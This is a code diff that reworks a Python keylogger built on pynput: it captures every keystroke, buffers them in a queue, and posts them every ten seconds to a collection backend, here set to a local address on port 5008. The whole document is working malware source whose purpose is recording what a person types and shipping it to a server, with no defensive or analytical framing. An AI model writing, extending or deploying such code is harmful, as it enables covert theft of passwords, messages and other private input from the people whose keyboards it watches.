@@ -2,11 +2,12 @@ import requests
 from pynput import keyboard
 import threading
 import datetime
+import queue
 
 log = ""
-log_file = "keylog.txt"
+log_queue = queue.Queue()
 interval = 10
-BACKEND_URL = 'http://127.0.0.1:5000/log' 
+BACKEND_URL = 'http://127.0.0.1:5008/log'
 
 def send_log_to_backend(log_data):
     try:
@@ -21,14 +22,18 @@ def send_log_to_backend(log_data):
 def save_log():
     global log
     if log:
-        send_log_to_backend(log)  # Send log to backend instead of saving locally
+        log_queue.put(log)
         log = ""
-    timer = threading.Timer(interval, save_log)
-    timer.start()
+    threading.Timer(interval, save_log).start()
+
+def process_queue():
+    while True:
+        if not log_queue.empty():
+            log_data = log_queue.get()
+            send_log_to_backend(log_data)
 
 def on_press(key):
     global log
-
     try:
         if key == keyboard.Key.space:
             log += " "
@@ -39,8 +44,9 @@ def on_press(key):
         elif key == keyboard.Key.backspace:
             log = log[:-1]
         elif key == keyboard.Key.esc:
-            send_log_to_backend(log)  
-            return False  
+            if log:
+                send_log_to_backend(log)
+            return False  # Stop the keylogger
         else:
             log += str(key.char)
     except AttributeError:
@@ -48,6 +54,9 @@ def on_press(key):
 
 print("[*] Starting keylogger...")
 save_log()
+
+# Start queue processor thread
+threading.Thread(target=process_queue, daemon=True).start()
 
 with keyboard.Listener(on_press=on_press) as listener:
     listener.join()
